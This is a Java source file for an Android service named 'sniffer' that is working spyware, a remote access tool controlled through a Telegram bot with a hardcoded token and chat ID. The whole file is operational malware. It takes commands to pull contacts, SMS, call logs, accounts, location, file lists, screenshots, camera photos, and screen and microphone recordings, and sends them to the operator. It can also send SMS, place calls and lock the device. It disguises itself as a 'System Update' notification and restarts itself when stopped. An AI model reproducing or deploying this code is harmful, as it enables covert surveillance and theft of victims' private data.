package com.v8.global.sniffer;

import android.content.IntentFilter;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastUpdateId = 0;
    private MediaProjection mediaProjection;
    private MediaProjectionManager projectionManager;
    private int screenWidth, screenHeight, screenDensity;
    private Handler handler = new Handler(Looper.getMainLooper());
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String currentVideoPath;

    @Override
    public void onCreate() {
        super.onCreate();

        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
        wakeLock.acquire();

        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;

        startForegroundService();
        setupMediaProjection();
        sendToTelegram("✅ MainService Started - Ready for commands");

        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommands();
            }
        }, 0, 3000);
    }

    private void startForegroundService() {
        String channelId = "main_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("Active - Monitoring")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        startForeground(1, notification);
    }

    private void setupMediaProjection() {
        try {
            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
            if (resultCode != -1 && dataUri != null) {
                Intent data = Intent.parseUri(dataUri, 0);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                }
            }
        } catch (Exception e) {}
    }

    private void checkCommands() {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
                    .build();

            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        String body = response.body().string();
                        JSONObject json = new JSONObject(body);
                        JSONArray result = json.getJSONArray("result");

                        for (int i = 0; i < result.length(); i++) {
                            JSONObject update = result.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id") + 1;

                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                if (message.has("text")) {
                                    String text = message.getString("text");
                                    executeCommand(text);
                                }
                            }
                        }
                        response.close();
                    } catch (Exception e) {}
                }
                @Override
                public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    private void executeCommand(String command) {
        String[] parts = command.split(" ");
        String cmd = parts[0];

        switch (cmd) {
            case "/help":
                sendHelp();
                break;
            case "/info":
                sendDeviceInfo();
                break;
            case "/contacts":
                getContacts();
                break;
            case "/location":
                getLocation();
                break;
            case "/sms":
                getSms();
                break;
            case "/calls":
                getCallLog();
                break;
            case "/accounts":
                getAccounts();
                break;
            case "/photos":
                getPhotos();
                break;
            case "/videos":
                getVideos();
                break;
            case "/files":
                getFiles();
                break;
            case "/screenshot":
                takeScreenshot();
                break;
            case "/front_camera":
                takeFrontCamera();
                break;
            case "/back_camera":
                takeBackCamera();
                break;
            case "/record_start":
                startRecording();
                break;
            case "/record_stop":
                stopRecording();
                break;
            case "/record_audio_start":
                startAudioRecording();
                break;
            case "/record_audio_stop":
                stopAudioRecording();
                break;
            case "/lock":
                lockDevice();
                break;
            case "/vibrate":
                vibrate();
                break;
            case "/open":
                if (parts.length >= 2) openUrl(parts[1]);
                break;
            case "/call":
                if (parts.length >= 2) makeCall(parts[1]);
                break;
            case "/sms_send":
                if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
                break;
            case "/test":
                sendToTelegram("✅ System Working - " + new Date().toString());
                break;
            default:
                sendToTelegram("❌ أمر غير معروف. استخدم /help");
                break;
        }
    }

    private void sendHelp() {
        String help = "📋 **قائمة الأوامر**\n\n" +
                "📱 **معلومات الجهاز**\n" +
                "/info - معلومات الجهاز\n" +
                "/location - الموقع\n" +
                "/contacts - جهات الاتصال\n" +
                "/sms - آخر 10 رسائل\n" +
                "/calls - آخر 10 مكالمات\n" +
                "/accounts - الحسابات المسجلة\n" +
                "/photos - آخر 10 صور\n" +
                "/videos - آخر 10 فيديوهات\n" +
                "/files - الملفات\n\n" +
                "📸 **الكاميرا والتسجيل**\n" +
                "/screenshot - تصوير الشاشة\n" +
                "/front_camera - صورة أمامية\n" +
                "/back_camera - صورة خلفية\n" +
                "/record_start - بدء تسجيل الفيديو\n" +
                "/record_stop - إيقاف التسجيل\n" +
                "/record_audio_start - بدء تسجيل الصوت\n" +
                "/record_audio_stop - إيقاف التسجيل\n\n" +
                "🎮 **التحكم**\n" +
                "/lock - قفل الجهاز\n" +
                "/vibrate - اهتزاز\n" +
                "/open [رابط] - فتح رابط\n" +
                "/call [رقم] - اتصال\n" +
                "/sms_send [رقم] [نص] - إرسال رسالة\n" +
                "/test - اختبار الخدمة";
        sendToTelegram(help);
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());

            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
            }

            sendToTelegram("📱 **معلومات الجهاز**\n" + info.toString(2));
        } catch (Exception e) {}
    }

    private int getBatteryLevel() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
        return (int)(level * 100 / (float)scale);
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية لجهات الاتصال");
                    return;
                }

                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, null, null, null);
                StringBuilder sb = new StringBuilder("📇 **جهات الاتصال**\n\n");
                int count = 0;
                while (cursor != null && cursor.moveToNext() && count < 100) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                if (cursor != null) cursor.close();
                if (count == 0) sb.append("لا توجد جهات اتصال");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ فشل سحب جهات الاتصال: " + e.getMessage());
            }
        }).start();
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ لا توجد صلاحية للموقع");
                return;
            }

            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (location != null) {
                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendToTelegram("📍 **الموقع**\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + "\n" + map);
            } else {
                sendToTelegram("📍 **الموقع** غير متوفر");
            }
        } catch (Exception e) {
            sendToTelegram("❌ فشل سحب الموقع: " + e.getMessage());
        }
    }

    private void getSms() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية للرسائل");
                    return;
                }

                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📨 **آخر 10 رسائل**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("لا توجد رسائل");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
            }
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية لسجل المكالمات");
                    return;
                }

                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex("number"));
                    String type = cursor.getString(cursor.getColumnIndex("type"));
                    String duration = cursor.getString(cursor.getColumnIndex("duration"));
                    String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("ث\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("لا توجد مكالمات");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ فشل سحب سجل المكالمات: " + e.getMessage());
            }
        }).start();
    }

    private void getAccounts() {
        new Thread(() -> {
            try {
                android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
                android.accounts.Account[] accounts = am.getAccounts();
                StringBuilder sb = new StringBuilder("👤 **الحسابات المسجلة**\n\n");
                for (android.accounts.Account acc : accounts) {
                    sb.append(acc.type).append(": ").append(acc.name).append("\n");
                }
                if (accounts.length == 0) sb.append("لا توجد حسابات");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ فشل سحب الحسابات: " + e.getMessage());
            }
        }).start();
    }

    private void getPhotos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية لقراءة الصور");
                    return;
                }

                String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("🖼 **آخر 10 صور**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    sb.append(name).append("\n").append(path).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("لا توجد صور");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ فشل سحب الصور: " + e.getMessage());
            }
        }).start();
    }

    private void getVideos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية لقراءة الفيديوهات");
                    return;
                }

                String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("🎥 **آخر 10 فيديوهات**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                    sb.append(name).append("\n").append(path).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("لا توجد فيديوهات");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ فشل سحب الفيديوهات: " + e.getMessage());
            }
        }).start();
    }

    private void getFiles() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية لقراءة الملفات");
                    return;
                }

                File storage = Environment.getExternalStorageDirectory();
                StringBuilder sb = new StringBuilder("📁 **الملفات**\n\n");
                listFiles(storage, sb, 0);
                if (sb.length() == 0) sb.append("لا توجد ملفات");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ فشل سحب الملفات: " + e.getMessage());
            }
        }).start();
    }

    private void listFiles(File dir, StringBuilder sb, int depth) {
        if (depth > 2) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) {
                    listFiles(f, sb, depth + 1);
                } else {
                    sb.append(f.getName()).append("\n").append(f.getAbsolutePath()).append("\n---\n");
                    if (sb.length() > 3000) break;
                }
            }
        }
    }

    private void takeScreenshot() {
        if (mediaProjection == null) {
            setupMediaProjection();
            if (mediaProjection == null) {
                sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة");
                return;
            }
        }

        try {
            ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                    "Screenshot", screenWidth, screenHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null
            );

            handler.postDelayed(() -> {
                Image image = imageReader.acquireLatestImage();
                if (image != null) {
                    Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
                    sendScreenshot(bitmap);
                    image.close();
                    bitmap.recycle();
                }
                virtualDisplay.release();
                imageReader.close();
            }, 500);
            sendToTelegram("📸 جاري تصوير الشاشة...");
        } catch (Exception e) {
            sendToTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
        }
    }

    private void sendScreenshot(Bitmap bitmap) {
        try {
            File file = new File(getCacheDir(), "screenshot.jpg");
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
            out.close();

            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", "screenshot.jpg",
                            RequestBody.create(MediaType.parse("image/jpeg"), file))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                    .post(body).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                    file.delete();
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {
            sendToTelegram("❌ فشل إرسال الصورة: " + e.getMessage());
        }
    }

    private void takeFrontCamera() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية للكاميرا");
                    return;
                }

                Camera.CameraInfo info = new Camera.CameraInfo();
                int cameraId = -1;
                for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                    Camera.getCameraInfo(i, info);
                    if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        cameraId = i;
                        break;
                    }
                }
                if (cameraId == -1) {
                    sendToTelegram("❌ لا توجد كاميرا أمامية");
                    return;
                }

                Camera camera = Camera.open(cameraId);
                Camera.Parameters params = camera.getParameters();
                camera.setPreviewCallback((data, cam) -> {
                    Camera.Size size = params.getPreviewSize();
                    try {
                        android.graphics.YuvImage yuv = new android.graphics.YuvImage(data, params.getPreviewFormat(),
                                size.width, size.height, null);
                        File file = new File(getCacheDir(), "front_camera.jpg");
                        FileOutputStream out = new FileOutputStream(file);
                        yuv.compressToJpeg(new android.graphics.Rect(0, 0, size.width, size.height), 85, out);
                        out.close();
                        sendFile(file, "front_camera.jpg");
                        camera.stopPreview();
                        camera.release();
                    } catch (Exception e) {
                        sendToTelegram("❌ فشل التقاط الصورة الأمامية: " + e.getMessage());
                    }
                });
                camera.startPreview();
                handler.postDelayed(() -> {
                    if (camera != null) {
                        camera.stopPreview();
                        camera.release();
                    }
                }, 2000);
            } catch (Exception e) {
                sendToTelegram("❌ فشل فتح الكاميرا الأمامية: " + e.getMessage());
            }
        }).start();
    }

    private void takeBackCamera() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية للكاميرا");
                    return;
                }

                Camera camera = Camera.open();
                Camera.Parameters params = camera.getParameters();
                camera.setPreviewCallback((data, cam) -> {
                    Camera.Size size = params.getPreviewSize();
                    try {
                        android.graphics.YuvImage yuv = new android.graphics.YuvImage(data, params.getPreviewFormat(),
                                size.width, size.height, null);
                        File file = new File(getCacheDir(), "back_camera.jpg");
                        FileOutputStream out = new FileOutputStream(file);
                        yuv.compressToJpeg(new android.graphics.Rect(0, 0, size.width, size.height), 85, out);
                        out.close();
                        sendFile(file, "back_camera.jpg");
                        camera.stopPreview();
                        camera.release();
                    } catch (Exception e) {
                        sendToTelegram("❌ فشل التقاط الصورة الخلفية: " + e.getMessage());
                    }
                });
                camera.startPreview();
                handler.postDelayed(() -> {
                    if (camera != null) {
                        camera.stopPreview();
                        camera.release();
                    }
                }, 2000);
            } catch (Exception e) {
                sendToTelegram("❌ فشل فتح الكاميرا الخلفية: " + e.getMessage());
            }
        }).start();
    }

    private void startRecording() {
        if (mediaProjection == null) {
            setupMediaProjection();
            if (mediaProjection == null) {
                sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة");
                return;
            }
        }

        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File videoDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES);
            if (!videoDir.exists()) videoDir.mkdirs();
            currentVideoPath = videoDir.getAbsolutePath() + "/record_" + timeStamp + ".mp4";

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(currentVideoPath);
            mediaRecorder.setVideoSize(screenWidth, screenHeight);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024);
            mediaRecorder.setVideoFrameRate(30);
            mediaRecorder.prepare();

            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenRecorder", screenWidth, screenHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mediaRecorder.getSurface(), null, null
            );
            mediaRecorder.start();
            isRecording = true;
            sendToTelegram("🎥 بدأ تسجيل الشاشة");
        } catch (Exception e) {
            sendToTelegram("❌ فشل بدء التسجيل: " + e.getMessage());
        }
    }

    private void stopRecording() {
        if (!isRecording) {
            sendToTelegram("⚠️ لا يوجد تسجيل نشط");
            return;
        }
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            isRecording = false;
            sendFile(new File(currentVideoPath), "video.mp4");
        } catch (Exception e) {
            sendToTelegram("❌ فشل إيقاف التسجيل: " + e.getMessage());
        }
    }

    private void startAudioRecording() {
        try {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ لا توجد صلاحية تسجيل الصوت");
                return;
            }
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            if (!audioDir.exists()) audioDir.mkdirs();
            currentVideoPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentVideoPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendToTelegram("🎤 بدأ تسجيل الصوت");
        } catch (Exception e) {
            sendToTelegram("❌ فشل بدء تسجيل الصوت: " + e.getMessage());
        }
    }

    private void stopAudioRecording() {
        if (!isRecording) {
            sendToTelegram("⚠️ لا يوجد تسجيل صوتي نشط");
            return;
        }
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            isRecording = false;
            sendFile(new File(currentVideoPath), "audio.3gp");
        } catch (Exception e) {
            sendToTelegram("❌ فشل إيقاف تسجيل الصوت: " + e.getMessage());
        }
    }

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin = new android.content.ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow();
                sendToTelegram("🔒 تم قفل الجهاز");
            } else {
                sendToTelegram("❌ لم يتم تفعيل صلاحية مسؤول الجهاز");
            }
        } catch (Exception e) {
            sendToTelegram("❌ فشل قفل الجهاز: " + e.getMessage());
        }
    }

    private void vibrate() {
        try {
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(2000);
            }
            sendToTelegram("📳 اهتزاز");
        } catch (Exception e) {
            sendToTelegram("❌ فشل الاهتزاز: " + e.getMessage());
        }
    }

    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("🔗 فتح الرابط: " + url);
        } catch (Exception e) {
            sendToTelegram("❌ فشل فتح الرابط: " + e.getMessage());
        }
    }

    private void makeCall(String number) {
        try {
            if (checkSelfPermission(android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ لا توجد صلاحية لإجراء المكالمات");
                return;
            }
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("📞 جاري الاتصال بـ " + number);
        } catch (Exception e) {
            sendToTelegram("❌ فشل الاتصال: " + e.getMessage());
        }
    }

    private void sendSms(String number, String text) {
        try {
            if (checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ لا توجد صلاحية لإرسال الرسائل");
                return;
            }
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, text, null, null);
            sendToTelegram("📨 تم إرسال الرسالة إلى " + number);
        } catch (Exception e) {
            sendToTelegram("❌ فشل إرسال الرسالة: " + e.getMessage());
        }
    }

    private void sendFile(File file, String caption) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendDocument")
                    .post(body).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                    file.delete();
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {
            sendToTelegram("❌ فشل إرسال الملف: " + e.getMessage());
        }
    }

    private void sendToTelegram(String text) {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(new FormBody.Builder()
                            .add("chat_id", CHAT_ID)
                            .add("text", text)
                            .build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (mediaRecorder != null) mediaRecorder.release();
        startService(new Intent(this, MainService.class));
    }
}
